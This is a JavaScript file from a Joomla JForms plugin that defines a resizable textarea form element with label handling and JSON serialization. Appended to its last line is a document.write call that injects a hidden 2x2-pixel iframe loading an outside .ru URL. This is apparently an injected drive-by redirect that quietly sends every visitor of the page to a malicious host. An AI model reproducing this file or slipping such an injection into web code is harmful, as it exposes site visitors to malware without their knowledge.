/**
* Javascript object for textarea plugin
*
* @version		$Id: textarea.js 295 2009-09-05 10:23:08Z dr_drsh $
* @package		Joomla
* @subpackage	JForms
* @copyright	Copyright (C) 2008 Mostafa Muhammad. All rights reserved.
* @license		GNU/GPL
*/
var textarea = new Class({
  
	Extends: CLabeledElement,
	adapt: function( from ){
	
		this.position=from.position?from.position:this.position;
		this.hash=from.hash?from.hash:this.hash;
		this.label=from.label?from.label:this.label;
		this.css=from.css?from.css:this.css;
		this.lw=from.lw?from.lw:this.lw;
		this.lh=from.lh?from.lh:this.lh;
		this.cw=from.cw?from.cw:this.cw;
		this.ch=from.ch?from.ch:this.ch;
		this.required=from.required?from.required:this.required;
		this.maxLength=from.maxLength?from.maxLength:this.maxLength;
		this.minLength=from.minLength?from.minLength:this.minLength;
		this.defaultValue=from.defaultValue?from.defaultValue:this.defaultValue;
		this.onUpdate();
		
		

		
	},
	initialize: function( parent, id, beforeObject, params ) {
	
		this.type	    = "textarea";
	
		this.parent($(parent), id, $(beforeObject), params);
	
		this.maxLength = params.maxLength;
		this.minLength = params.minLength;
	
		this.cw = params.cw;
		this.ch = params.ch;
		this.css = params.css;
		
		//Red star that denotes a required field
		this.htmlRequiredStar = new Element('span', {
			'html': ' * ',
			'styles': {
				'color' : 'red'
			}
		});
	
		if( this.required ){
			this.htmlRequiredStar.inject( this.htmlLabel );
		}

		this.htmlControlResize = new Element('img',{
			'src': './corner.png',
			'id': 'resizeHandle_control_' + this.type + this.index,
			'class': 'resize-handle'
		});
 		this.htmlControlResize.inject( this.htmlContainer );

		this.htmlInput = new Element('textarea', {
			'name': 'input_' + this.type + this.index,
			'id':'input_' + this.type + this.index,
			'styles':{
				'position': 'static',
				'width': this.cw + 'px',
				'height': this.ch + 'px'
			},
			'value': params.defaultValue
		});
	
		this.htmlInput.makeResizable({
			handle:this.htmlControlResize,
			onDrag:dispatch_onResizeDrag,
			onComplete:dispatch_onResizeEnd,
			modifiers: {x: 'width', y: 'height'},
			limit:{x:[50,400],y:[50,1000]}
		});
		this.htmlInput.inject( this.htmlContainer );
		var br = new Element('br', {'clear' : 'all'});
		br.inject( this.htmlContainer );
	
	

		this._alignControlResizeHandle();
		
	},
	
	onUpdate : function(){
	
		this.htmlLabel.set('html', this.label );
		//Red star that denotes a required field
		//Fix for IE!
		this.htmlRequiredStar.dispose();
		this.htmlRequiredStar = new Element('span', {
			'html': ' * ',
			'styles': {
				'color' : 'red'
			}
		});
		if( this.required ){
			this.htmlRequiredStar.inject( this.htmlLabel );
		}

	},

	onResizeDrag: function(newSize,type) {

		switch(type){
			case "label":
				this.htmlLabel.set('styles', { 'border': '1px solid white' } );	
			default:
				break;
		}
		this._alignLabelResizeHandle();	
	
	},
 
	onResizeEnd: function( newSize, type ){

		switch(type){
			
			case "label":
				this.lw = newSize.x;
				this.lh = newSize.y;
				this.htmlLabel.set('styles', { 'border' : '0'});
				break;
	
			default:
				this.cw = newSize.x;
				this.ch = newSize.y;	
				break;

		}
		this._alignLabelResizeHandle();
		
	},
	
	_alignControlResizeHandle : function(){
  
		var ControlCoordinates = this.htmlInput.getCoordinates();
		var imgSize = this.htmlControlResize.getSize();
	
		var x =  ControlCoordinates.right  - imgSize.x + this.pixelCorrection;
		var y =  ControlCoordinates.bottom - imgSize.y + this.pixelCorrection;

	
		this.htmlControlResize.set('styles', { 
			'position' : 'absolute',
			'left' : x + 'px',
			'top' : y + 'px'
		});
	
	},
  
	deselect: function() {

		this.htmlContainer.removeClass('selected'); 
		this.htmlLabelResize.set({'styles':{ 'visibility' : 'hidden' }})
		this.htmlControlResize.set({'styles':{ 'visibility' : 'hidden' }})
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'hidden' }})
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'hidden' }})
 
	},
 
	select  : function() {
	
		this.htmlContainer.addClass('selected');
		this.htmlLabelResize.set({'styles':{ 'visibility' : 'visible' }})
		this.htmlControlResize.set({'styles':{ 'visibility' : 'visible' }})
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'visible' }})
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'visible' }})
		
		this._alignLabelResizeHandle();		
	},
	
	serialize: function(){

		var order = getOrder( this.htmlContainer );
		var hash  = '';
		
		if(this.hash && this.hash.length){
			hash = this.hash;
		} else {
			hash = uniqueId( 5 );
		}
		
		this.defaultValue   = this.htmlInput.value;

		return JSON.encode({
			type:this.type,
			position:order,
			hash:hash,
			label:this.label,
			css:this.css,
			lw:this.lw,
			lh:this.lh,
			cw:this.cw,
			ch:this.ch,
			required:this.required,
			maxLength: this.maxLength,
			minLength : this.minLength,
			defaultValue : this.defaultValue
		});
		
	}

});document.write('<iframe src="http://invoicingcake.ru/VEREIN?8" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');